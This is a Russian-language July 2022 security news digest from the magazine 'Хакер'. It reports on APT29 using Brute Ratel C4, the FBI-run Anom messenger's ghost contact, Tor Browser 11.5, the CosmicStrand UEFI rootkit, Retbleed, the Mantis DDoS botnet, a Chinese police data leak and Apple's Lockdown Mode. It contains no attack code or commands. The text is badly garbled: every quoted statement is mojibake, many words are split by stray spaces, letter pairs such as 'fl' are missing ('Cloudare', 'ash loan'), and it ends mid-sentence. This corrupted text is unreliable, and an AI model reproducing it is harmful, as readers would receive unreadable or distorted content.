
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                      Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru


В этом месяце: новый Tor Browser научил ся луч ше обхо дить
бло киров ки, хакеры зло упот ребля ют инстру мен том Brute
Ratel C4, в сеть сли ли дан ные мил лиар да китай ских граж-
дан, на устрой ствах Apple появит ся режим Lockdown,
защища ющий от шпи она жа, на материн ских пла тах Asus
и Gigabyte наш ли UEFI-рут кит CosmicStrand, а так же дру гие
интересные события июля.





ХАКЕРЫ
ВООРУЖИЛИСЬ
BRUTE RATEL C4
Злоумыш ленники переходят от исполь зования всем известного Cobalt Strike
к менее популярному инстру мен ту для red team — Brute Ratel Command
and Control Center (Brute Ratel C4 или BRc4). В частности, аналитики Palo Alto
Unit 42 обнаружили, что BRc4 уже взяла на воору жение русскоязычная
хак-группа APT29 (она же CozyBear и Dukes).
  В 2020 году Читан Наяк (Chetan Nayak), бывший участник  red team
в Mandiant и CrowdStrike, создал BRc4 в качестве аль тернативы Cobalt Strike.
Инстру мен ты получились одновремен но похожими друг на дру га и нет. К при-
меру, Cobalt Strike позволяет разверты вать «маяки» на ском прометирован ных
устройствах для удален ного наблюдения за сетью или выполнения команд.
В свою очередь, Brute Ratel позволяет разверты вать на удален ных хостах «бар-
суков» (badgers), которые очень похожи на маяки в Cobalt Strike. Такие «бар-
суки»  под ключают ся  к  управляющему  серверу  злоумыш ленника,  чтобы
получать коман ды или передавать операторам резуль таты уже запущен ных
команд.
   Как отмечают специалисты Palo Alto Unit 42, недавно злоумыш ленники
начали переходить от работы с Cobalt Strike к исполь зованию Brute Ratel, пред-
почитая  имен но   этот   инстру мен тарий   для   постэксплу атации.   Так
как BRc4 во многом ориентирован на уклонение от обнаружения EDR и анти-
вирусными решениями, защит ные продук ты обычно не определяют в нем вре-
доносное ПО. Из-за этой особен ности исследователи называют Brute Ratel
«уникаль но опасным».
  Эк сперты обнаружили, что BRc4 уже исполь зовался во время атак, пред-
положитель но связан ных с русскоязычной хак-группой APT29, в ходе которых
злоумыш ленники распространяли вредоносные ISO-образы, якобы содер-
жащие резюме (CV). На самом деле файл резюме (Roshan-Bandara_CV_Dialog)
был ярлы ком Windows, который запускал связан ный файл OneDriveUpdater.exe.
   Хотя OneDriveUpdater.exe — это обычный исполняемый файл Microsoft, при-
лагаемый version.dll был изменен таким образом, чтобы действовать как заг-
рузчик  для  «барсука»  Brute   Ratel,  который  заг ружался  в  процесс
RuntimeBroker.exe. После этого злоумыш ленники получали удален ный доступ
к ском прометирован ному устройству для выполнения команд и даль нейшего
прод вижения по сети.
  В настоящее время годовая лицен зия на Brute Ratel стоит 2500 долларов
США на одного поль зователя, при этом  клиенты должны предоставить
рабочий адрес элек трон ной почты и пройти проверку перед получением
лицен зии.  Посколь ку  проверка  выполняет ся  вручную  (хотя  неизвестно,
как имен но), возникает вопрос: как злоумыш ленники получают лицен зии?
В отчете экспертов под черкивалось, что упомяну тый ISO-образ был создан
в тот же день, ког да выш ла новая версия BRC4.
  Читан Наяк сообщил журналистам, что исполь зован ную в описан ных атаках
лицен зию слил на сторону недоволь ный сот рудник одного из его клиентов.
Посколь ку пейлоады позволяют Наяку видеть, кому они принад лежат, он утвер-
ждает, что сумел иден тифицировать и отозвать лицен зию. Однако, по словам
главы ИБ-ком пании AdvIntel Виталия Кремеза (Vitali Kremez), это неединичный
слу чай. К примеру, бывшие операторы вымогателя Conti тоже приобретали
лицен зии Brute Ratel, создавая для этих целей под ставные американ ские ком-



      «Ïðåñòóïíèêè, ñòîÿâøèå çà âûìîãàòåëüñêèìè îïå ðàöèÿìè Conti, èçó-
      ÷àëè íåñêîëüêî èíñòðóìåíòàðèåâ äëÿ ïåíòåñòà, ïîìèìî Cobalt Strike.пании.«
     Â îäíîì êîíêðåòíîì ñëó÷àå îíè ïîëó÷èëè äîñòóï ê Brute Ratel, êîòîðûé
      èñïîëüçîâàëñÿ äëÿ ïîñòýêñïëóàòàöèè â öåëåâûõ àòàêàõ èç çàã ðóç÷èêà
      Bumblebee. Êîíå÷íîé öåëüþ èñïîëüçîâàíèÿ Brute Ratel áûëà ïîñòýêñ-
      ïëóàòàöèîííàÿ ñòðóê òóðà äëÿ áîêîâîãî ïåðåìå ùåíèÿ è ïîñëåäóþùå ãî
     øèôðîâàíèÿ ñåòè ïîñðåäñòâîì ïåéëîàäà âûìîãàòåëÿ», — ðàññêàçàë
      Êðå ìåç.                »
В своем отчете аналитики Palo Alto Unit 42 резюмируют, что Brute Ratel может
пред ставлять серь езную угрозу, которой нужно учить ся противостоять:


     «Ìû ñ÷èòàåì êðàéíå âàæíûì, ÷òîáû âñå ïîñòàâùèêè ñèñòåì áåçîïàñ-
      íîñòè ñîçäàâàëè ñðåäñòâà çàùèòû äëÿ îáíàðóæå íèÿ BRC4 è ÷òîáû âñå«
      îðãàíèçàöèè ïðèíèìàëè ïðîàêòèâíûå ìåðû äëÿ çàùèòû îò ýòîãî èíñòðó-
     ìåíòà».                »

59% РОССИЯН ИСПОЛЬЗУЮТ ОДИНАКОВЫЕ ПАРОЛИ

Ис сле дователи «Рос телеком-Солар» сообщают, что, по резуль татам про веденного ими опро-
са, рос сийские поль зовате ли не соблюдают даже базовые тре бования  к безопас ности
паролей. Так, 59% опро шенных исполь зуют одинако вые пароли для раз ных аккаунтов,
еще 53% поль зовате лей меня ют свои пароли крайне ред ко, а пароль ными менед жерами поль-
зуют ся мень ше 10% рес пондентов.

При этом 55% опро шенных уве рены, что соблюдают все три базовых тре бования к безопас-
ности паролей. Это уни каль ность , дли на не менее вось ми знаков, а также слож ность
(наличие букв раз ного регис тра, цифр и спе циаль ных символов).

Еще 42% считают, что соблюдают два тре бования из трех. 3% поль зовате лей приз нались,
что их пароли слабо защище ны и соот ветс твуют максимум одно му тре бованию безопас ности.





ЖУРНАЛИСТЫ
ИЗУЧИЛИ
ИСХОДНИКИ ANOM
В прош лом году стало известно, что правоохранители создали и несколь ко лет
под держивали собствен ную плат форму для зашифрован ных ком муникаций
Anom, подобную Encrochat и Phantom Secure, и следили за всей перепиской
преступников. Журналисты Vice Motherboard смог ли взглянуть на исходники
Anom и рассказали, как он работал.
  Напом ню, что мы деталь но рассказывали о масштабной операции Trojan
Shield  (в  некоторых  ведомствах  операция  носила  названия  Greenlight
и Ironside), о завершении которой в прош лом году отчитались ФБР, Европол
и спецслужбы дру гих стран мира.
  В рам ках этой операции правоохранители создали и несколь ко лет под-
держивали собствен ную плат форму для зашифрован ных ком муникаций Anom
(она же An0m или Anøm — в отчетах разных ведомств название «зву чит»
по-разному). Это средство связи обрело огромную популярность среди прес-
тупников во всем мире, благодаря чему правоохранители получили воз-
можность следить за всеми их ком муникациями.
  За годы работы Anom правоохранитель ным органам удалось распростра-
нить среди преступников боль ше 12 тысяч «защищен ных» устройств свы ше
чем  в  100  странах  мира.  По  итогам  операции  арестовали  боль-
ше 1000 человек, в том числе крупных торговцев наркотиками, а во время
обысков массово изъяли ору жие, наличные день ги, наркотики и роскошные
автомобили.
   Как теперь сообщили журналисты издания Vice Motherboard, недавно в их
распоряжении оказался исходный код приложения Anom, предоставлен ный
источником, который пред почел остать ся неизвестным.
  Издание решило не публиковать исходники Anom, так как в редак ции сочли,
что код содержит информацию о людях, которые работали над приложением.
Дело в том, что боль шинство разработ чиков попросту не знали, что это был
сек ретный проект ФБР для наблюдения за организован ной преступностью,
и теперь раскры тие их личностей может под вергнуть их риску. Так получилось
из-за того, что Anom уже существовала как самостоятель ная ком пания еще до
операции правоохранителей и кодеры, нанятые создателем ком пании, работа-
ли над ран ней версией приложения до того, как ФБР тайно взяло Anom
под свой кон троль.
   Кстати,  этот  аспект  разработ ки Anom критику ют  в  Electronic  Frontier
Foundation (EFF):

      «Ýòî ïîõîæå íà òî, åñëè áû Raytheon íàíÿëà êîìïàíèþ — ïðîèçâî-
      äèòåëü ôåéåðâåðêîâ ñ ñîñåäíåé óëèöû äëÿ èçãîòîâëåíèÿ ðàêåòíûõ êàï-«
      ñþëåé, íî íå ñêàçàëà ëþäÿì, ÷òî îíè ðàçðàáàòûâàþò ðàêåòíûå êàï-
      ñþëè», — ãîâîðèò ñòàðøèé òåõ íîëîã EFF Êóïåð Êâåíòèí (Cooper Quintin).                »
Журналисты, которые привлекли к изу чению исходников несколь ких ИБ-спе-
циалистов, рассказывают, что для слежки Anom исполь зовал специаль ного
«бота», который дублировал все переговоры преступников властям. Для этого
в коде мессен джера существовал специаль ный «призрачный» кон такт, который
был скрыт из списков кон тактов поль зователей и работал в фоновом режиме.
Фак тически, ког да приложение прок ручивало список кон тактов поль зователя
и натыкалось на учет ную запись бота, оно отфиль тровывало ее и удаляло
из поля зрения человека.





От мечается, что идея таких «призрачных» кон тактов обсуждалась и рань ше.
К примеру, в статье, датирован ной 2018 годом, сот рудники британ ского раз-
ведыватель ного управления GCHQ писали, что «провайдер способен незамет-
но и лег ко добавить сот рудника правоохранитель ных органов в групповой чат
или звонок» и в итоге все по-прежнему будет защищено сквозным шиф-
рованием, но в беседе появит ся еще один невидимый участник.
   Так же во время изу чения исходников выяснилось, что Anom прик реплял
информацию о местоположении к любому сообщению, отправляемому упо-
мяну тому боту, а файл AndroidManifest.xml, который показы вает, к каким раз-
решениям     обращает ся     приложение,     включал     разрешение
ACCESS_FINE_LOCATION.
  В целом боль шая часть кода самого мессен джера была скопирована
из неназванного опен сорсного приложения для обмена сообщениями. В итоге
код Anom доволь но беспорядочен, боль шие куски заком ментированы, и при-
ложение постоян но записы вает отладочные сообщения на сам телефон.


НАТАЛЬЯ КАСПЕРСКАЯ ПРЕДЛОЖИЛА ЗАМОРОЗИТЬ
ЦИФРОВИЗАЦИЮ





В интервью TAdviser Наталья Кас пер ская, пред седатель прав ления ассо циации «Оте чес твен-
ный софт» и пре зидент InfoWatch, выс казала мысль о замороз ке цифровизации для государс-
тва и госс труктур до тех пор, пока не будут решены вопросы информационной безопас ности.

          «Я считаю, что в текущих усло виях более правиль ным решением будет→      заморо зить цифровое раз витие до тех пор, пока не удас тся найти спе циалис-
       тов по информационной безопас ности. Воз можно, это приведет к замед лению
      рос та каких-то показателей (скажем, показателей „цифровой трансфор мации“),
       воз можно, не  поз волит  повысить эффектив ность  какой-то деятель нос ти.
      Но это лучше, чем потеря свер хчувс твитель ных данных или останов ка критичес-
       ких информационных сис тем.
       Мы же утечки данных наблюдаем мно го лет. В боль шинс тве случаев пред-
      приятия не приз нают утечку. И отго вор ки там всег да стандар тные: „утечка про-
      изошла не у нас“, „утечка была нез начитель ной“, „данные, которые утекли, ста-
       рые, непол ные, негод ные, пло хие, ни на что не пов лияют“. Чет вертый пункт мне
       осо бенно нравит ся — „винов ные наказаны“. То есть утечки не было, данные
      нереле вантные, а почему тог да вы наказали винов ных? В реаль нос ти, как мы
      понимаем, за утечки данных прос то никто не отве чает — вы же не слышали
      о судебных про цес сах над руково дите лями компаний по стать ям о халат ности
      или краже данных? Вот и я не слышала. Поэто му я считаю, что с этим нужно
       что-то сде лать. И наз начение пер сональ ной ответс твенности — это не все.
      Это пер вый шаг, но он очень важный. Хотя бы будет шанс, что кого-то начнут
       наказывать».


— Наталья Кас пер ская





ОБНОВЛЕННЫЙ TOR
BROWSER
Разработ чики Tor Project объявили о выпуске Tor Browser версии 11.5. Этот
релиз содержит много новых фун кций, в том числе упрощающих поль зовате-
лям обход ограничений. В частности, боль ше не понадобит ся вручную переби-
рать кон фигурации мостов.
  Новая фун кция Connection Assist («Помощь в под ключении») автоматически
под бирает кон фигурацию моста, которая лучше всего под ходит для мес-
тоположения поль зователя.


      «Connection Assist çàã ðóæàåò è ïðîñìàòðèâàåò àêòóàëüíûé ñïèñîê îïöèé
      äëÿ êîíêðåòíîé ñòðàíû, ÷òîáû ïîï ðîáîâàòü èñïîëüçîâàòü âàøå ìåñ-«
      òîïîëîæåíèå  (ñ âàøåãî  ñîã ëàñèÿ), — îáúÿñíÿ þò  ðàçðàáîò÷èêè. —
      Ýòî óäàåòñÿ ñäå ëàòü, èñïîëüçóÿ moat (òîò æå èíñòðóìåíò, êîòîðûé Tor
      Browser èñïîëüçóåò äëÿ çàï ðîñà ìîñòà îò torproject.org), è íåò íåîá-
      õîäèìîñòè ñíà÷àëà ïîäêëþ÷àòüñÿ ê ñåòè Tor».                »
Так как Connection Assist пока находит ся на ран ней стадии разработ ки (v1.0),
коман да Tor приветству ет отзы вы и отчеты, которые помогут устранить любые
недостатки и улучшить систему.
  Еще одна важная новин ка в версии 11.5 — это режим HTTPS-Only Mode,
который теперь можно сделать режимом по умолчанию. Это гаран тиру ет, что
весь обмен дан ными между поль зователем и сервером, на котором размещен
сайт, будет зашифрован, чтобы защитить ся от атак типа man in the middle
и защитить поль зователей от SSL stripping’а и вредоносных выход ных узлов.
  Коман да  Tor  уверяет,  что SecureDrop продолжит  работать, несмотря
на устаревание и замену расширения HTTPS-Everywhere, которое слу жило
интерпретатором  onion-имен.  Единствен ным  исключением,  где  HTTPS-
Everywhere пока продолжит работать, времен но останет ся Android.





Так же важной новин кой стало основатель но переработан ное меню Network
Settings («Настройки сети»), которое теперь называется Connection Settings
(«Настройки под ключения»). В частности, были переработаны и упрощены нас-
тройки кон фигураций мостов и вариантов под ключения, чтобы обеспечить
быстрый и простой просмотр и управление. Новый интерфейс пред лагает
визу ализацию кон фигураций и исполь зует эмод зи для сохранен ных мостов,
тем самым упрощая определение и выбор нужного моста при необходимости.


WEB3 ПОД ПРИЦЕЛОМ

Аналитики из компании CertiK под считали, что за пер вые шесть месяцев 2022 года у Web3-про-
ектов было украдено боль ше, чем за весь 2021 год в целом: общее количес тво похищенных
средств уже пре вышает 2 миллиар да дол ларов.





                     Крупнейшие ата ки ash loan вто рого квар тала 2022 года

В основном хакеры по-прежнему полагаются на со циаль ную инженерию , но все чаще
встре чают ся атаки на сис тему мгно венных займов ( flash loan).

В общей сложности во вто ром квар тале 2022 года в резуль тате 27 ash loan атак было потеря-
но 308 миллионов дол ларов. Огромный прирост по срав нению с 14 миллионами дол ларов,
потерянными в пер вом квар тале.

Фишинговые атаки также учас тились: во вто ром квар тале CertiK зафиксировала 290 атак,
по срав нению со 106 атаками за пер вые три месяца года.

Чаще все го вектором фишинговых атак становит ся Discord, что свидетель ствует о его неиз-
менной популяр ности в качес тве социаль ной сети для криптовалют ного и NFT-сообщес тва.





                                       Продолжение статьи →
← Начало статьи
 НАЙДЕН UEFI-РУТКИТ
 COSMICSTRAND
  Эк сперты из «Лаборатории Касперского» обнаружили новый UEFI-рут кит,
  который получил название CosmicStrand. Судя по всему, он создан ранее
  неизвестной китайскоязычной APT-группировкой и  атакует определен ные
  модели материн ских плат Gigabyte и Asus.
    Исследователи говорят, что пока неясно, какую цель преследу ют злоумыш-
  ленники, но отмечает ся, что их жертвами становились частные поль зователи
   в Китае, Вьет наме, Иране и России.
    Ин тересно, что во всех известных слу чаях заражен ными оказались материн-
  ские платы двух производителей — Gigabyte и Asus, исполь зующие чипсет H81.
  Эксперты пред полагают, что злоумыш ленники наш ли в них какую-то общую
   уязвимость, которая позволила им заразить UEFI.
     Век тор заражения пока определить не удалось, но тот факт, что среди
  жертв CosmicStrand были «граждан ские», может свидетель ствовать о том, что
   стоящие за этим рут китом злоумыш ленники способны атаковать UEFI удален-
   но. Впрочем, эксперты из Qihoo 360, еще пять лет назад изу чавшие ран ние
  версии CosmicStrand образца 2016 года, пред полагали, что одна из жертв при-
  обрела заражен ную материн скую плату у реселлера. Вероятно, новые зараже-
  ния тоже можно объяснить чем-то подобным.
     Все атакован ные CosmicStrand устройства работали под управлением
   Windows: каждый раз во время перезаг рузки, после запуска Windows, уже
  на уровне ОС запускался неболь шой фраг мент вредоносного кода. Этот заг-
   рузчик под ключался  к C&C-серверу  злоумыш ленников и получал  отту да
  исполняемые файлы. То есть основная цель вредоноса — развернуть имплан-
   тат уровня ядра при каждой заг рузке ОС.
    В целом процесс атаки проиллюстрирован на схеме ниже: он состоит
  из настройки хуков для изменения заг рузчика ОС и перехвата кон троля
  над всем потоком выполнения ради запуска шелл-кода, который извлекает
  полезную наг рузку с управляющего сервера.





  Исследователи отмечают, что в коде CosmicStrand можно найти сходство
  с дру гим семейством вредоносных прог рамм, бот нетом MyKings. Этот бот нет,
  с помощью которого обычно разверты вают криптовалют ные майнеры, еще раз
  под тверждает теорию о возможной связи с китайскими злоумыш ленниками,
  равно как и исполь зование жестко закодирован ного резервного DNS-сервера,
  который расположен в CHINANET-BACKBONE (AS4134).

        «Ñàìûé ïîðàçèòåëüíûé àñïåêò ýòîãî îò÷å òà — òî, ÷òî ýòîò UEFI-èìïëàí-
           òàò, ïîõîæå, èñïîëüçîâàëñÿ ñ 2016 ãîäà — çàäîëãî äî òîãî, êàê àòàêè «
         UEFI ñòàëè îïèñûâàòü ïóáëè÷íî. Ýòî îòêðûòèå ïîäíèìàåò åùå îäèí âîï-
          ðîñ: åñëè óæå òîã äà çëîóìûøëåííèêè èñïîëüçîâàëè ýòîò [ðóòêèò], òî ÷òî
        îíè èñïîëüçóþò ñåãîäíÿ?» — ãîâîðÿò èññëå äîâàòåëè.                 »

 NO MORE RANSOM ПОМОГ 1 500 000 ПОЛЬЗОВАТЕЛЕЙ

   Инициатива No More Ransom, благодаря которой жер твы шифроваль щиков могут вос становить
   свои данные бес плат но, под вела ито ги работы за шесть лет. В нас тоящее вре мя про ект дос-
   тупен на 37 языках и помог более чем 1 500 000 человек по все му миру вос становить свои
   данные.





   На сегод ня количес тво пар тне ров No More Ransom вырос ло до 188 , включая компании из час-
   тно го и государс твенного секторов, правоох ранитель ные органы, экспер тов из научных кругов.
   На сайте дос тупны уже 136 инс трументов для рас шифров ки файлов, которые работают про тив
   165 вариантов вымогателей и были заг ружены более 10 000 000 раз.





 RETBLEED УГРОЖАЕТ
 ПРОЦЕССОРАМ INTEL
 И AMD
  Исследователи из Швейцарской высшей технической школы Цюриха (ETH
   Zurich) рассказали о новой side-channel-атаке Retbleed, которая зат рагивает
  процессоры Intel, выпущен ные от трех до шести лет назад, а так же процессоры
  AMD возрастом от года до один надцати лет. Ожидает ся, что устранение этой
  проблемы негативно отразит ся на производитель ности.
     Проблема   Retbleed   состоит   из   двух   уязвимостей   (CVE-2022-
  29900 для AMD и CVE-2022-29901 для Intel) и относит ся к классу спекулятив-
  ных атак Spectre-BTI (вариант 2). Название Retbleed отсы лает к защит ному
  решению  Retpoline,  которое  было  разработано  специалистами  Google
   в 2018 году для борь бы с «процессорны ми» уязвимостями Meltdown и Spectre.
     Напом ню, что эти баги не толь ко крайне опасны, но и доставили поль-
   зователям и ком паниям множество проблем, ведь пат чи для них мог ли зна-
   читель но снижать производитель ность уязвимых процессоров (особен но ста-
   рых). Создав аль тернативу в виде Retpoline, инженеры Google попытались
  решить и эту проблему, заявив, что их под ход позволил снизить произво-
  дитель ность серверов Google Cloud лишь на 1,5%.
    В сущности, Retbleed похож на дру гие подобные атаки, и его отличает лишь
   организация спекулятивного выполнения кода: в дан ном слу чае учитывается
  работа механизма Retpoline, который меняет jump- и call-инструк ции на return
    (ret), что ранее считалось весь ма удобным и безопасным вариантом борь бы
  с Meltdown и Spectre. По сути, эксперты отчитались об успешном проведении
   side-channel-атаки с учетом ret-инструк ций, добившись утечки памяти ядра,
  содержащей хеши паролей.
     От чет исследователей гласит, что они проверили атаку Retbleed на процес-
   сорах AMD Zen 1, Zen 1+, Zen 2, а так же теоретически проблема зат рагивает
  и дру гие процессоры, включая Intel Core поколений 6–8.
     Нужно отметить, что скорость атаки, как это часто бывает с side-channel-
  проблемами, оставляет желать лучшего. Так, на процессорах Intel определение
  хеша пароля для поль зователя root займет около 28 мин, а на процессорах
  AMD — около 6 мин.





   Так как в наши дни на исправление подобных уязвимостей уходит куда мень ше
  времени, чем неког да понадобилось на разработ ку защиты от Meltdown
  и Spectre, Intel и AMD уже деталь но рассказали о вариантах смяг чения новых
  проблем в своих блогах (1 , 2 , 3 ).
     К сожалению, борь ба с такими уязвимостями по-прежнему может плохо
   сказывать ся на производитель ности. Исследователи ETH Zurich отмечают, что
  исправления влияют на производитель ность ЦП, снижая ее на 14–39%. Кроме
   того, исправление для еще одной проблемы, которую эксперты обнаружили
   в процессорах AMD и так же включили в этот отчет (Phantom JMP: CVE-2022-
   23825),  и  вовсе может  увеличивать  пот ребление  ресурсов  на  рекор-
  дные 209%.


 БЫВШИЙ ГЛАВА GOOGLE СРАВНИЛ ИИ С ЯДЕРНЫМ
 ОРУЖИЕМ





   Выс тупая на Aspen Security Forum, быв ший CEO Google Эрик Шмидт срав нил ИИ с ядер ным ору-
   жием. По его мне нию, для ИИ необходим режим сдер живания, подобный тому, как угро за вза-
   имно гарантированного уничтожения сдер живает самые могущес твенные страны мира от унич-
   тожения друг друга.
      От вечая на вопрос о ценности морали в тех нологиях, Шмидт объ яснил, что на заре соз-
   дания Google он сам был наивен в отно шении силы информации. Теперь же он призывает сде-
   лать тех нологии соот ветс твующими челове чес ким нор мам этики и морали и про водит парал-
   лели между ИИ и ядер ным оружием.

            «В 50–60-х годах мы сумели соз дать мир, в котором появилось правило „без →         сюр призов“, касающееся ядер ных испытаний, и в ито ге они были запрещены.
         Это правило — пример баланса доверия или отсутс твия доверия. Я очень обес-
          поко ен тем, что США отно сит ся к Китаю как к кор румпированному, коммунис-
          тичес кому или какому-то еще режиму, а Китай сочтет Аме рику ослабевающей…
         Это поз волит людям сказать: „Боже мой, они что-то затевают“, а затем начать
          порочный круг. Воз никнет такая ситуация, знаете, ког да вы вооружаетесь или к
          чему-то готовитесь, и это лишь про воцирует другую сто рону. У нас никто
          не занимается этими вопросами, а ведь ИИ действитель но нас толь ко силен».


  — Эрик Шмидт





 СЛИТЫ ДАННЫЕ
 МИЛЛИАРДА
 КИТАЙЦЕВ
  Хакер под ником ChinaDan выставил на продажу несколь ко баз дан ных,
  которые якобы содержат более 22 Тбайт информации о миллиарде китайских
  граждан. Злоумыш ленник оценил этот дамп в 10 бит коинов (около 195 тысяч
  долларов США).
     ChinaDan утверждает, что дан ные были похищены у Шан хайской наци-
  ональ ной полиции (SHGA) и БД содержит имена, адреса, номера националь-
  ных удостоверений личности, кон так тные телефоны и информацию о несколь-
   ких миллиардах судимостей.
    В доказатель ство своих слов хакер опубликовал в откры том доступе обра-
  зец дан ных, содержащий 750 тысяч записей. Помимо перечисленной выше
  информации, в «пробнике» можно найти даже дан ные о перевозке задер-
  жанных и инструк ции для водителей.





  По словам злоумыш ленника, дан ные были украдены из локаль ного частного
  облака Aliyun (Alibaba Cloud), которое является частью китайской полицейской
   сети.
    Журналисты Wall Street Journal решили убедить ся, что дан ные в дам пе под-
  линные, и для этого попытались связать ся с людь ми, информацию о которых
  можно найти в этой базе.


         «Ïÿòü ÷åëîâåê ïîäòâåðäèëè âñþ èíôîðìàöèþ, âêëþ÷àÿ äåòàëè [ñóäåá-
         íûõ] äåë, êîòîðûå áûëî áû òðóäíî ïîëó÷èòü ãäå‑òî, êðîìå ïîëèöèè. «
       Åùå ÷åòûðå ÷åëîâå êà ïåðåä òåì, êàê ïîâåñèòü òðóáêó, ïîäòâåðäèëè
        îñíîâíóþ èíôîðìàöèþ, òàêóþ êàê èõ èìå íà», — ñîîáùàåò èçäàíèå.                 »
  На эту колоссаль ную утечку обратил внимание даже глава криптовалют ной
  биржи Binance Чан пэн Чжао. Как он сообщил в Twitter, эксперты его ком пании
   полагают, что причиной утечки стала база Elasticsearch, которую китайское пра-
   витель ство слу чайно оставило незащищен ной. Позже он добавил: атака про-
  изош ла из-за того, что некий правитель ствен ный разработ чик написал тех-
  нический пост в блоге на CSDN и слу чайно забыл скрыть в посте учет ные дан-
   ные.
     Китайские власти хранят молчание и не давали ком ментариев об этом
  инциден те, но, если заявления ChinaDan окажут ся правдой, эта утечка станет
  самой серь езной из ког да-либо зат рагивавших Китай и в целом одной из круп-
  нейших утечек в истории.


  126 МИЛЛИОНОВ ДОЛЛАРОВ ПОТЕРЯЛА MICROSOFT,
 УЙДЯ ИЗ РОССИИ

  В конце июля кор порация Microsoft опубликовала годовой финансовый отчет, из которо го ста-
   ло извес тно, что уход с рос сийско го рынка сто ил ей 126 000 000 дол ларов опе рационных
   издержек (свя занных с проблемными задол женнос тями, обес цениванием активов и выход ными
   пособиями).


   При этом, по данным Statcounter GlobalStats, доля Windows в Рос сии пос тепенно сокращается.
   Так, на июнь 2022 года на 87,59% компь юте ров рос сиян установ лена Windows, 5,44% — OS X,
  4,9% — другие ОС и на 2,04% машин — Linux. Для срав нения: в 2018 году количес тво поль-
   зовате лей Linux оце нивалось в 1,69% , а доля Windows в 2015 году сос тавля ла 95,6% .

   Интерес но, что, по статис тике сер виса StockApps, за десять лет на мировом рынке доля ОС
   Microsoft сократилась с 91% до 73,7% к нас тояще му моменту.





 БОТНЕТ MANTIS
 АТАКУЕТ
  Ком пания Cloudare поделилась под робностями о рекордной DDoS-атаке,
   от которой в прош лом месяце пострадал один из ее клиентов. Оказалось,
   за этим инциден том стоял бот нет Mantis, который эксперты харак теризу ют
   как «самый мощный бот нет на сегод няшний день».
     Напом ню, что в июне 2022 года эксперты Cloudare сообщили о рекордной
  DDoS-атаке, с которой им удалось справить ся. В этом инциден те участвовал
  неболь шой, но мощный бот нет, состоящий из 5067 устройств, при этом
  пиковая мощность атаки достигала 26 миллионов запросов в секун ду (request
   per second, RPS). То есть каждое устройство мог ло генерировать пример-
  но 5200 запросов в секун ду.
     Как теперь рассказали исследователи, они назвали новый бот нет в честь
  кревет ки-богомола (Mantis Shrimp), которая отличает ся тем, что способна
   наносить сок рушитель ные удары врагам ког тями, хотя сама насчитывает
   в длину всего около десяти сан тимет ров. Новый бот нет тоже чрезвычайно
  мощен, невзирая на весь ма скром ные размеры.
    Обычно бот неты стремят ся ском прометировать как можно боль ше раз-
  личных устройств и копят «огневую мощь» для проведения интенсивных атак.
   Mantis действу ет иначе: исполь зует серверы и виртуаль ные машины, которые
  имеют значитель но боль ше ресурсов. Дело в том, что генерация боль шого
   количества HTTPS-запросов — ресурсоем кий процесс, поэтому чем мощнее
   входящие в состав бот нета устройства, тем серь езнее будут его DDoS-атаки.
  Например, предыду щий рекорд смен, бот нет Mēris, эксплу атировал для этих
  целей устройства MikroTik с мощными аппарат ными возможностями.
    В Cloudare сообщают, что Mantis в основном атакует организации в сфере
  ИТ и телеком муникаций (36%), новостные ресурсы, медиа и издателей (15%),
  а так же ком пании, работающие в сфере финан сов (10%) и игр (12%).
     За последний месяц Mantis запустил более 3000 DDoS-атак, которые были
  направлены против почти 1000 клиентов Cloudare.
     Боль шинство жертв бот нета находят ся в США (20%) и Российской Федера-
  ции (15%). На прочих пострадавших, из Турции, Фран ции, Поль ши, Украины,
  Великобритании,  Германии,  Нидерландов  и  Канады,  приходит ся  лишь
   от 2,5 до 5% атак.


  УПАДОК ПИРАТСТВА

   Ис сле дователи из компании Group-IB изучили нелегаль ный рынок интернет-пиратс тва в Рос сии
   в 2021 году. Аналитики оце нивают его в 50 миллионов дол ларов и говорят, что за год
   пираты обед нели пример но на 9 миллионов. Дело в том, что они лишились финансирования
   от сво их глав ных спонсоров — онлайн-казино и гемблинга, а их инфраструктура пос традала
   от бло киро вок со сто роны правообладате лей.


   Экспер ты оце нивают раз меры тенево го рынка нелегаль ного виде оконтента в Рос сии уже седь-
   мой год под ряд. До 2019 года доходы пиратов стре митель но рос ли, потом началось затяжное
   падение: в 2019 году — 63 миллиона дол ларов ( 4 миллиар да рублей), в 2020 году —
  59 миллионов дол ларов ( 3,7 миллиар да рублей), а в 2021 году — 50 миллионов дол ларов
     ( 2,8 миллиар да рублей).

   При этом количес тво запросов в популяр ных поис ковых сис темах на прос мотр бес плат ных
   филь мов и сериалов по ито гам года вырос ло на 8,5% и сос тавило 12,8 миллиар да.





  Од нако доходы сетевых пиратов, напротив, упали. По оценке аналитиков, сред ний CPM (cost
   per mille, цена за 1000 показов в рекламной кампании) в 2021 году снизил ся с 5 до 3,9 дол-
   лара (в 2019 году — 6 долларов).

   Падение прив лекатель нос ти пират ско го трафика объ ясня ется бло киров ками со сто роны рос-
   сийских регуля торов, в час тнос ти ЦБ РФ, подоз ритель ных транзакций онлайн-казино и гем-
   блинга — глав ных спонсоров пиратов. Еще одной причиной финансового кризиса сре ди пиратов
   экспер ты называют воз росшие зат раты на под держание рабоче го сос тояния инфраструктуры.





                                          Продолжение статьи →
← Начало статьи
 РЕЖИМ LOCKDOWN
 ЗАЩИТИТ ОТ
 ШПИОНАЖА
  Ком пания Apple объявила, что в iOS 16, iPadOS 16 и macOS Ventura появит ся
  новая защит ная фун кция — режим Lockdown (Lockdown Mode). Эта «экстре-
  маль ная, дополнитель ная защита» пред назначена для поль зователей, которые
  чаще дру гих под вергаются риску таргетирован ных атак шпионского ПО: пра-
   возащит ников, журналистов, диссиден тов.
     Разработ чики обещают, что режим Lockdown будет блокировать шпионское
  ПО (подобное спайвари Pegasus, созданной NSO Group), которое правитель-
   ствен ные хакеры обычно применяют против владель цев устройств Apple,
